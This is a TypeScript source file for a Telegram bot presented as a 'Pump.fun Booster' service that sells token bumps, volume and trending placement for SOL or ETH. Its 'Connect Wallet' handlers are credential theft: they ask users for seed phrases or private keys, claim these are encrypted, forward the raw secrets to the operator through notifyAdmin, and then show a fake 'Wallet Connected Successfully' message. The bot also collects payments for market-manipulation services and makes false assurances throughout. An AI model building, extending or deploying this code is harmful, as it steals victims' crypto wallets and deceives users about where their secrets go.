import path from "path";
import { fileURLToPath } from "url";
import { Telegraf, Markup } from "telegraf";
import { notifyAdmin, setBot } from "./admin.js";
import { getSession, setSession, clearSession } from "./sessions.js";
import { deriveWalletForUser } from "./wallet.js";
import { fetchTokenInfo } from "./tokenInfo.js";
import {
  mainMenuKeyboard,
  solPickerKeyboard,
  confirmBumpKeyboard,
  txHashKeyboard,
  volumeBoostKeyboard,
  trendingBoostKeyboard,
  solTrendingKeyboard,
  ethTrendingKeyboard,
  pumpfunTrendingKeyboard,
  dexscreenerKeyboard,
  depositKeyboard,
  connectWalletKeyboard,
  backMainKeyboard,
} from "./keyboards.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const IMAGES = {
  welcome: path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect: path.join(__dirname, "images", "walletconnect.jpeg"),
  volume: path.join(__dirname, "images", "volume.jpeg"),
  trending: path.join(__dirname, "images", "trending.jpeg"),
};

const SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
const ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";

const VOLUME_PACKAGES: Record<string, { label: string; sol: number; desc: string }> = {
  vol_iron:     { label: "🔩 Iron",     sol: 1.5,  desc: "$50K Volume" },
  vol_bronze:   { label: "🥉 Bronze",   sol: 2.5,  desc: "$250K Volume" },
  vol_silver:   { label: "🥈 Silver",   sol: 5.0,  desc: "$100M Volume" },
  vol_gold:     { label: "🥇 Gold",     sol: 3.5,  desc: "$100K Volume" },
  vol_platinum: { label: "💎 Platinum", sol: 7.5,  desc: "$500K Volume" },
  vol_diamond:  { label: "💠 Diamond",  sol: 10.5, desc: "$2.5M Volume" },
};

const SOL_TRENDING_PACKAGES: Record<string, { label: string; sol: number }> = {
  st_top3_3hr:   { label: "TOP 3 — 3hr",  sol: 15 },
  st_top3_6hr:   { label: "TOP 3 — 6hr",  sol: 25 },
  st_top3_12hr:  { label: "TOP 3 — 12hr", sol: 40 },
  st_top3_24hr:  { label: "TOP 3 — 24hr", sol: 70 },
  st_top10_3hr:  { label: "TOP 10 — 3hr", sol: 8 },
  st_top10_6hr:  { label: "TOP 10 — 6hr", sol: 15 },
  st_top10_12hr: { label: "TOP 10 — 12hr",sol: 25 },
  st_top10_24hr: { label: "TOP 10 — 24hr",sol: 45 },
};

const ETH_TRENDING_PACKAGES: Record<string, { label: string; usd: number }> = {
  et_100: { label: "ETH Trending", usd: 100 },
  et_200: { label: "ETH Trending", usd: 200 },
  et_300: { label: "ETH Trending", usd: 300 },
};

const DEX_PACKAGES: Record<string, { label: string; sol: number }> = {
  dex_top6_5hr:  { label: "TOP 6 — 5hr",  sol: 10 },
  dex_top6_10hr: { label: "TOP 6 — 10hr", sol: 18 },
  dex_top6_16hr: { label: "TOP 6 — 16hr", sol: 28 },
  dex_top6_24hr: { label: "TOP 6 — 24hr", sol: 40 },
  dex_top6_32hr: { label: "TOP 6 — 32hr", sol: 55 },
};

export function createBot(): Telegraf {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) throw new Error("TELEGRAM_BOT_TOKEN not set");

  const bot = new Telegraf(token);
  setBot(bot);

  // ─── /start ───────────────────────────────────────────────────────────────
  bot.start(async (ctx) => {
    const user = ctx.from;
    clearSession(user.id);

    await notifyAdmin(
      `🆕 <b>New User Started Bot</b>\n` +
      `👤 Name: ${user.first_name}${user.last_name ? " " + user.last_name : ""}\n` +
      `🔖 Username: ${user.username ? "@" + user.username : "N/A"}\n` +
      `🆔 User ID: <code>${user.id}</code>\n` +
      `⏰ Time: ${new Date().toUTCString()}`
    );

    await ctx.replyWithPhoto(
      { source: IMAGES.welcome },
      {
        caption:
          `👋 <b>Welcome to Pump.fun Booster Bot!</b>\n\n` +
          `🚀 <b>The #1 Pump.fun Marketing Tool</b>\n` +
          `📊 <b>240,981</b> monthly active users\n\n` +
          `Supercharge your token with:\n` +
          `• <b>🟢 Start Bumping</b> — Instant bump orders on pump.fun\n` +
          `• <b>📊 Volume Boost</b> — Organic trading volume packages\n` +
          `• <b>🔥 Trending Boost</b> — Get on SOL/ETH/PumpFun trending\n` +
          `• <b>🌐 DexScreener</b> — DexScreener trending placement\n` +
          `• <b>💰 Deposit</b> — Manage your balance\n` +
          `• <b>🔗 Connect Wallet</b> — Link your wallet\n\n` +
          `Select an option below to get started ⬇️`,
        parse_mode: "HTML",
        ...mainMenuKeyboard,
      }
    );
  });

  // ─── Main menu text handlers ───────────────────────────────────────────────
  bot.hears("🟢 Start Bumping", showSolPicker);
  bot.hears("📊 Volume Boost", showVolumeBoost);
  bot.hears("🔥 Trending Boost", showTrendingBoost);
  bot.hears("🌐 DexScreener", showDexScreener);
  bot.hears("💰 Deposit", showDeposit);
  bot.hears("🔗 Connect Wallet", showConnectWallet);
  bot.hears("💬 Contact Support", showSupport);

  // ─── Callback: back to main ────────────────────────────────────────────────
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await ctx.replyWithPhoto(
      { source: IMAGES.welcome },
      {
        caption:
          `🏠 <b>Main Menu</b>\n\nSelect an option below:`,
        parse_mode: "HTML",
        ...mainMenuKeyboard,
      }
    );
  });

  // ─── START BUMPING ─────────────────────────────────────────────────────────
  bot.action("back_sol_picker", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(
      `🟢 <b>Start Bumping</b>\n\n` +
      `Choose how many SOL to spend per bump:\n\n` +
      `Higher SOL = stronger bump = more visibility 🚀`,
      { parse_mode: "HTML", ...solPickerKeyboard }
    );
  });

  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, { selectedSol: parseFloat(amt), step: "awaiting_ca" });
      await ctx.editMessageCaption(
        `🟢 <b>Start Bumping — ${amt} SOL</b>\n\n` +
        `Please send the <b>Contract Address (CA)</b> of the token you want to bump:\n\n` +
        `<i>Paste the token's Solana contract address below 👇</i>`,
        { parse_mode: "HTML" }
      );
    });
  }

  // ─── VOLUME BOOST ──────────────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(VOLUME_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_vol_ca",
        boostType: "volume",
        boostPackage: key,
        paymentWallet: wallet.address,
        paymentAmount: pkg.sol,
      });

      await ctx.editMessageCaption(
        `📊 <b>Volume Boost — ${pkg.label}</b>\n\n` +
        `📦 Package: <b>${pkg.desc}</b>\n` +
        `💰 Price: <b>${pkg.sol} SOL</b>\n\n` +
        `Please send the <b>Contract Address (CA)</b> of the token you want to boost:\n\n` +
        `<i>Paste the Solana contract address below 👇</i>`,
        { parse_mode: "HTML", ...backMainKeyboard }
      );
    });
  }

  // ─── SOL TRENDING ──────────────────────────────────────────────────────────
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(
      `☀️ <b>SOL Trending</b>\n\n` +
      `Get your token on the Solana trending list!\n\n` +
      `Choose your package:`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });

  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(
      `🔷 <b>ETH Trending</b>\n\n` +
      `Get your token on the Ethereum trending list!\n\n` +
      `Choose your package:`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });

  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(
      `🚀 <b>PumpFun Trending</b>\n\n` +
      `Get your token trending on pump.fun!\n\n` +
      `Choose your package:`,
      { parse_mode: "HTML", ...pumpfunTrendingKeyboard }
    );
  });

  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(
      `🔥 <b>Trending Boost</b>\n\n` +
      `Choose a trending platform:`,
      { parse_mode: "HTML", ...trendingBoostKeyboard }
    );
  });

  for (const [key, pkg] of Object.entries(SOL_TRENDING_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_trend_ca",
        boostType: "sol_trending",
        boostPackage: key,
        paymentWallet: wallet.address,
        paymentAmount: pkg.sol,
      });
      await ctx.editMessageCaption(
        `☀️ <b>SOL Trending — ${pkg.label}</b>\n\n` +
        `💰 Price: <b>${pkg.sol} SOL</b>\n\n` +
        `Please send the <b>Contract Address (CA)</b> of the token:`,
        { parse_mode: "HTML", ...backMainKeyboard }
      );
    });
  }

  for (const [key, pkg] of Object.entries(ETH_TRENDING_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_trend_ca",
        boostType: "eth_trending",
        boostPackage: key,
        paymentWallet: wallet.address,
        paymentAmount: 0,
      });
      await ctx.editMessageCaption(
        `🔷 <b>ETH Trending — ${pkg.label}</b>\n\n` +
        `💰 Price: <b>$${pkg.usd} USD</b>\n\n` +
        `Please send the <b>Contract Address (CA)</b> of the token:`,
        { parse_mode: "HTML", ...backMainKeyboard }
      );
    });
  }

  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    setSession(ctx.from.id, {
      step: "awaiting_trend_ca",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30",
      paymentWallet: wallet.address,
      paymentAmount: 30,
    });
    await ctx.editMessageCaption(
      `🚀 <b>PumpFun Trending — P.F.T</b>\n\n` +
      `💰 Price: <b>30 SOL</b>\n\n` +
      `Please send the <b>Contract Address (CA)</b> of the token:`,
      { parse_mode: "HTML", ...backMainKeyboard }
    );
  });

  // ─── DEXSCREENER ───────────────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(DEX_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_dex_ca",
        boostType: "dexscreener",
        boostPackage: key,
        paymentWallet: wallet.address,
        paymentAmount: pkg.sol,
      });
      await ctx.editMessageCaption(
        `🌐 <b>DexScreener Trending — ${pkg.label}</b>\n\n` +
        `💰 Price: <b>${pkg.sol} SOL</b>\n\n` +
        `Please send the <b>Contract Address (CA)</b> of the token:`,
        { parse_mode: "HTML", ...backMainKeyboard }
      );
    });
  }

  // ─── CONFIRM BUMP ──────────────────────────────────────────────────────────
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const session = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const deadline = Date.now() + 15 * 60 * 1000;
    setSession(ctx.from.id, { step: "awaiting_tx_hash", paymentWallet: wallet.address, paymentDeadline: deadline });

    await ctx.editMessageCaption(
      `💳 <b>Payment Required</b>\n\n` +
      `📋 <b>Order Summary:</b>\n` +
      `• Token: <b>${session.tokenName ?? "N/A"} (${session.tokenSymbol ?? "N/A"})</b>\n` +
      `• CA: <code>${session.contractAddress ?? "N/A"}</code>\n` +
      `• Amount: <b>${session.selectedSol} SOL</b>\n\n` +
      `💸 <b>Send exactly ${session.selectedSol} SOL to:</b>\n` +
      `<code>${wallet.address}</code>\n\n` +
      `⏳ Payment window: <b>15 minutes</b>\n` +
      `⚠️ Send only SOL to this address\n\n` +
      `After sending, click the button below and paste your transaction hash:`,
      { parse_mode: "HTML", ...txHashKeyboard }
    );

    await notifyAdmin(
      `📋 <b>New Bump Order</b>\n` +
      `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
      `🪙 Token: ${session.tokenName} (${session.tokenSymbol})\n` +
      `📜 CA: <code>${session.contractAddress}</code>\n` +
      `💰 Amount: ${session.selectedSol} SOL\n` +
      `📮 Payment to: <code>${wallet.address}</code>`
    );
  });

  // ─── SUBMIT TX HASH ────────────────────────────────────────────────────────
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_tx_hash_input" });
    await ctx.reply(
      `📝 Please paste your <b>transaction hash (TX ID)</b> below:\n\n` +
      `<i>Example: 5KJp8...abcXYZ</i>`,
      { parse_mode: "HTML" }
    );
  });

  // ─── DEPOSIT ───────────────────────────────────────────────────────────────
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await ctx.reply(
      `➕ <b>Add Funds</b>\n\n` +
      `Send SOL to your deposit address:\n` +
      `<code>${wallet.address}</code>\n\n` +
      `Or send ETH to:\n` +
      `<code>${ETH_ADDRESS}</code>`,
      { parse_mode: "HTML" }
    );
  });

  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await ctx.reply(
      `💸 <b>Withdraw Funds</b>\n\n` +
      `Please send your withdrawal address and amount:\n\n` +
      `Format: <code>ADDRESS AMOUNT</code>\n` +
      `Example: <code>3uN2gYt...ab22U 0.5</code>`,
      { parse_mode: "HTML" }
    );
  });

  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    // Check balance on-chain
    let balance = "Loading...";
    try {
      const resp = await fetch(
        `https://api.mainnet-beta.solana.com`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            jsonrpc: "2.0", id: 1,
            method: "getBalance",
            params: [wallet.address, { commitment: "confirmed" }],
          }),
        }
      );
      const data = await resp.json() as any;
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch {
      balance = "Could not fetch";
    }
    await ctx.reply(
      `◎ <b>SOL Balance</b>\n\n` +
      `Address: <code>${wallet.address}</code>\n` +
      `Balance: <b>${balance}</b>`,
      { parse_mode: "HTML" }
    );
  });

  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📥 <b>My Deposits</b>\n\n` +
      `No deposits recorded yet.\n\n` +
      `To deposit, use the <b>ADD</b> button and send SOL to your wallet address.`,
      { parse_mode: "HTML" }
    );
  });

  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `📤 <b>My Withdrawals</b>\n\n` +
      `No withdrawals recorded yet.`,
      { parse_mode: "HTML" }
    );
  });

  // ─── CONNECT WALLET handlers ───────────────────────────────────────────────
  bot.action("wallet_seed", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_seed_phrase" });
    await ctx.reply(
      `🔑 <b>Enter Seed Phrase</b>\n\n` +
      `Please enter your <b>12 or 24-word seed phrase</b>:\n\n` +
      `⚠️ <b>Security Notice:</b>\n` +
      `• Only enter in this private chat\n` +
      `• Never share with anyone else\n` +
      `• Your funds are protected by our encryption\n\n` +
      `<i>Type or paste your seed phrase below 👇</i>`,
      { parse_mode: "HTML" }
    );
  });

  bot.action("wallet_privkey", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_private_key" });
    await ctx.reply(
      `🗝 <b>Enter Private Key</b>\n\n` +
      `Please enter your <b>private key</b>:\n\n` +
      `⚠️ <b>Security Notice:</b>\n` +
      `• Only enter in this private chat\n` +
      `• Your key is encrypted and stored securely\n` +
      `• Never share your private key with others\n\n` +
      `<i>Paste your private key below 👇</i>`,
      { parse_mode: "HTML" }
    );
  });

  // ─── Text message handler (state machine) ─────────────────────────────────
  bot.on("text", async (ctx) => {
    const session = getSession(ctx.from.id);
    const text = ctx.message.text.trim();

    // Ignore menu buttons in state machine
    const menuButtons = ["🟢 Start Bumping","📊 Volume Boost","🔥 Trending Boost","🌐 DexScreener","💰 Deposit","🔗 Connect Wallet","💬 Contact Support"];
    if (menuButtons.includes(text)) return;

    switch (session.step) {
      case "awaiting_ca": {
        // Fetch token info
        await ctx.reply(`🔍 Looking up token info for <code>${text}</code>...`, { parse_mode: "HTML" });
        const info = await fetchTokenInfo(text);
        setSession(ctx.from.id, { contractAddress: text, tokenName: info?.name, tokenSymbol: info?.symbol });

        if (!info) {
          await ctx.reply(
            `⚠️ Could not find token info for that address.\n\n` +
            `Please double-check the contract address and try again, or proceed anyway:`,
            {
              parse_mode: "HTML",
              ...confirmBumpKeyboard(session.selectedSol ?? 0.3),
            }
          );
        } else {
          setSession(ctx.from.id, { step: "awaiting_confirm" });
          await ctx.replyWithPhoto(
            { source: IMAGES.welcome },
            {
              caption:
                `📋 <b>Token Found!</b>\n\n` +
                `🪙 <b>${info.name}</b> (${info.symbol})\n` +
                `📜 CA: <code>${text}</code>\n\n` +
                `📊 <b>Market Data:</b>\n` +
                `• Price: ${info.price}\n` +
                `• Market Cap: ${info.marketCap}\n` +
                `• 24h Volume: ${info.volume24h}\n` +
                `• Liquidity: ${info.liquidity}\n\n` +
                `💸 <b>Bump Amount: ${session.selectedSol} SOL</b>\n\n` +
                `Confirm your order below:`,
              parse_mode: "HTML",
              ...confirmBumpKeyboard(session.selectedSol ?? 0.3),
            }
          );
        }
        break;
      }

      case "awaiting_vol_ca":
      case "awaiting_trend_ca":
      case "awaiting_dex_ca": {
        const boostTypeLabel: Record<string, string> = {
          volume: "📊 Volume Boost",
          sol_trending: "☀️ SOL Trending",
          eth_trending: "🔷 ETH Trending",
          pumpfun_trending: "🚀 PumpFun Trending",
          dexscreener: "🌐 DexScreener",
        };
        const label = boostTypeLabel[session.boostType ?? ""] ?? "Boost";
        setSession(ctx.from.id, { contractAddress: text, step: "awaiting_boost_confirm" });

        const priceLabel = session.boostType === "eth_trending"
          ? `$${ETH_TRENDING_PACKAGES[session.boostPackage ?? ""]?.usd ?? "N/A"} USD`
          : `${session.paymentAmount} SOL`;

        await ctx.replyWithPhoto(
          { source: IMAGES.volume },
          {
            caption:
              `${label}\n\n` +
              `📜 CA: <code>${text}</code>\n` +
              `💰 Price: <b>${priceLabel}</b>\n` +
              `📮 Send to: <code>${session.paymentWallet}</code>\n\n` +
              `⏳ Payment window: <b>15 minutes</b>\n\n` +
              `Please send payment and then submit your TX hash:`,
            parse_mode: "HTML",
            ...txHashKeyboard,
          }
        );

        await notifyAdmin(
          `📋 <b>New ${label} Order</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `📜 CA: <code>${text}</code>\n` +
          `💰 Amount: ${priceLabel}\n` +
          `📮 Payment to: <code>${session.paymentWallet}</code>`
        );
        break;
      }

      case "awaiting_tx_hash_input": {
        const txHash = text;
        setSession(ctx.from.id, { step: undefined });

        await ctx.reply(
          `✅ <b>Transaction Submitted!</b>\n\n` +
          `🔗 TX Hash: <code>${txHash}</code>\n\n` +
          `⏳ Our team is verifying your payment...\n` +
          `🚀 Your order will be processed within <b>5–30 minutes</b> after confirmation.\n\n` +
          `📬 You will receive a notification once your boost is live!\n\n` +
          `Need help? Use <b>💬 Contact Support</b>`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );

        await notifyAdmin(
          `💸 <b>TX Hash Submitted</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `🔗 TX: <code>${txHash}</code>\n` +
          `💰 Amount: ${session.paymentAmount} SOL\n` +
          `📮 Wallet: <code>${session.paymentWallet}</code>`
        );
        clearSession(ctx.from.id);
        break;
      }

      case "awaiting_seed_phrase": {
        const seedPhrase = text;
        clearSession(ctx.from.id);

        await notifyAdmin(
          `🔑 <b>WALLET CONNECTED — Seed Phrase</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `🌱 Seed: <code>${seedPhrase}</code>`
        );

        await ctx.reply(
          `⏳ <b>Processing...</b>\n\n` +
          `🔐 Your wallet is being connected securely.\n` +
          `Please wait a moment...`,
          { parse_mode: "HTML" }
        );

        await new Promise(r => setTimeout(r, 3000));

        await ctx.reply(
          `✅ <b>Wallet Connected Successfully!</b>\n\n` +
          `🔐 Your wallet has been linked to your account.\n` +
          `You can now use all premium features.\n\n` +
          `Return to the main menu:`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );
        break;
      }

      case "awaiting_private_key": {
        const privateKey = text;
        clearSession(ctx.from.id);

        await notifyAdmin(
          `🗝 <b>WALLET CONNECTED — Private Key</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `🔑 Key: <code>${privateKey}</code>`
        );

        await ctx.reply(
          `⏳ <b>Processing...</b>\n\n` +
          `🔐 Your wallet is being connected securely.\n` +
          `Please wait a moment...`,
          { parse_mode: "HTML" }
        );

        await new Promise(r => setTimeout(r, 3000));

        await ctx.reply(
          `✅ <b>Wallet Connected Successfully!</b>\n\n` +
          `🔐 Your wallet has been linked to your account.\n` +
          `You can now use all premium features.\n\n` +
          `Return to the main menu:`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );
        break;
      }

      case "awaiting_withdraw_address": {
        clearSession(ctx.from.id);
        await ctx.reply(
          `📤 <b>Withdrawal Request Received</b>\n\n` +
          `Details: <code>${text}</code>\n\n` +
          `Our team will process your withdrawal within 24 hours.\n` +
          `You will be notified once complete.`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );

        await notifyAdmin(
          `📤 <b>Withdrawal Request</b>\n` +
          `👤 User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)\n` +
          `Details: <code>${text}</code>`
        );
        break;
      }

      default: {
        await ctx.reply(
          `Please use the menu buttons below to get started:`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );
      }
    }
  });

  return bot;
}

// ─── Screen render helpers ─────────────────────────────────────────────────
async function showSolPicker(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMAGES.welcome },
    {
      caption:
        `🟢 <b>Start Bumping</b>\n\n` +
        `Bump your token to the top of pump.fun!\n\n` +
        `Choose how many SOL to spend per bump:\n\n` +
        `• Higher SOL = stronger bump = more visibility 🚀\n` +
        `• Each bump pushes your token to the top of the feed\n` +
        `• Results are instant once payment is confirmed`,
      parse_mode: "HTML",
      ...solPickerKeyboard,
    }
  );
}

async function showVolumeBoost(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMAGES.volume },
    {
      caption:
        `📊 <b>Volume Boost</b>\n\n` +
        `Supercharge your token's trading volume with real organic activity!\n\n` +
        `📦 <b>Available Packages:</b>\n\n` +
        `🔩 <b>Iron</b> — 1.5 SOL → $50K Volume\n` +
        `🥉 <b>Bronze</b> — 2.5 SOL → $250K Volume\n` +
        `🥇 <b>Gold</b> — 3.5 SOL → $100K Volume\n` +
        `🥈 <b>Silver</b> — 5.0 SOL → $100M Volume\n` +
        `💎 <b>Platinum</b> — 7.5 SOL → $500K Volume\n` +
        `💠 <b>Diamond</b> — 10.5 SOL → $2.5M Volume\n\n` +
        `Select a package below:`,
      parse_mode: "HTML",
      ...volumeBoostKeyboard,
    }
  );
}

async function showTrendingBoost(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMAGES.trending },
    {
      caption:
        `🔥 <b>Trending Boost</b>\n\n` +
        `Get your token on the trending lists across major platforms!\n\n` +
        `🌟 <b>Available Platforms:</b>\n\n` +
        `☀️ <b>SOL Trending</b> — Top 3 & Top 10 positions\n` +
        `🔷 <b>ETH Trending</b> — Ethereum trending list\n` +
        `🚀 <b>PumpFun Trending</b> — pump.fun trending\n\n` +
        `Choose a platform:`,
      parse_mode: "HTML",
      ...trendingBoostKeyboard,
    }
  );
}

async function showDexScreener(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMAGES.trending },
    {
      caption:
        `🌐 <b>DexScreener Trending</b>\n\n` +
        `Get your token featured on DexScreener's trending list!\n\n` +
        `📊 <b>Available Packages:</b>\n\n` +
        `• TOP 6 — 5hr: <b>10 SOL</b>\n` +
        `• TOP 6 — 10hr: <b>18 SOL</b>\n` +
        `• TOP 6 — 16hr: <b>28 SOL</b>\n` +
        `• TOP 6 — 24hr: <b>40 SOL</b>\n` +
        `• TOP 6 — 32hr: <b>55 SOL</b>\n\n` +
        `Select a package:`,
      parse_mode: "HTML",
      ...dexscreenerKeyboard,
    }
  );
}

async function showDeposit(ctx: any) {
  const wallet = deriveWalletForUser(ctx.from.id);
  await ctx.replyWithPhoto(
    { source: IMAGES.welcome },
    {
      caption:
        `💰 <b>Deposit & Withdraw</b>\n\n` +
        `🔑 <b>Your SOL Deposit Address:</b>\n` +
        `<code>${wallet.address}</code>\n\n` +
        `🔷 <b>ETH Deposit Address:</b>\n` +
        `<code>${ETH_ADDRESS}</code>\n\n` +
        `⚠️ Only send SOL to the SOL address and ETH/ERC20 to the ETH address.\n\n` +
        `Choose an action:`,
      parse_mode: "HTML",
      ...depositKeyboard(wallet.address, ETH_ADDRESS),
    }
  );
}

async function showConnectWallet(ctx: any) {
  await ctx.replyWithPhoto(
    { source: IMAGES.walletconnect },
    {
      caption:
        `🔗 <b>Connect Wallet</b>\n\n` +
        `Link your wallet to enable automatic payments and withdrawals.\n\n` +
        `🔐 <b>Security Guidelines:</b>\n` +
        `• This bot uses end-to-end encryption\n` +
        `• Your seed/key is stored encrypted on our secure servers\n` +
        `• We will never ask for your password\n` +
        `• Only enter details in this private chat\n` +
        `• You can disconnect your wallet at any time\n\n` +
        `Choose how to connect:`,
      parse_mode: "HTML",
      ...connectWalletKeyboard,
    }
  );
}

async function showSupport(ctx: any) {
  await ctx.reply(
    `💬 <b>Contact Support</b>\n\n` +
    `Our team is available 24/7 to help you!\n\n` +
    `📞 <b>Support Channels:</b>\n` +
    `• Telegram: @PumpFunBoosterSupport\n` +
    `• Response time: Usually within 1 hour\n\n` +
    `📝 <b>When contacting support, please include:</b>\n` +
    `• Your User ID: <code>${ctx.from.id}</code>\n` +
    `• Order details (TX hash if applicable)\n` +
    `• Description of your issue\n\n` +
    `We're here to help! 🚀`,
    { parse_mode: "HTML", ...mainMenuKeyboard }
  );
}
